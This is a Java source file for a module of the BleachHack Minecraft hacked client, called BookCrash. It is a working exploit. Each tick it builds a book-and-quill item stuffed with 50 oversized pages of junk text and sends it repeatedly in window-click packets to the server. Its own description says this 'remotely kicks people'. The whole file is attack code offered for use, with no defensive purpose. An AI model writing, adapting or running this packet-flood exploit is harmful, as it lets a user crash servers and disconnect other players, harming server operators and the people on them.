package bleach.hack.module.mods;

import bleach.hack.event.events.EventTick;
import bleach.hack.gui.clickgui.SettingSlider;

import com.google.common.eventbus.Subscribe;

import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.container.SlotActionType;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.server.network.packet.ClickWindowC2SPacket;

/* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
public class BookCrash extends Module {
	
	private int delay = 0;
	
	public BookCrash() {
		super("BookCrash", -1, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.",
				new SettingSlider(1, 20, 5, 0, "Uses: "),
				new SettingSlider(0, 5, 0, 0, "Delay: "));
	}

	@Subscribe
	public void onTick(EventTick event) {
		delay = (delay >= getSettings().get(1).toSlider().getValue() ? 0 : delay + 1);
		if(delay > 0) return;
		
		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        ListTag list = new ListTag();
        CompoundTag tag = new CompoundTag();
        String author = "Bleach";
        String title = "\n Bleachhack Owns All \n";
        /* random characters doesn't work but this does??????? */
        String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        
        for (int i = 0; i < 50; i++) {
            String siteContent = size;
            StringTag tString = new StringTag(siteContent);
            list.add(tString);
        }
        
        tag.putString("author", author);
        tag.putString("title", title);
        tag.put("pages", list);
        
        bookObj.putSubTag("pages", list);
        bookObj.setTag(tag);
        
        for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
        	mc.player.networkHandler.sendPacket(new ClickWindowC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
        }
	}
}
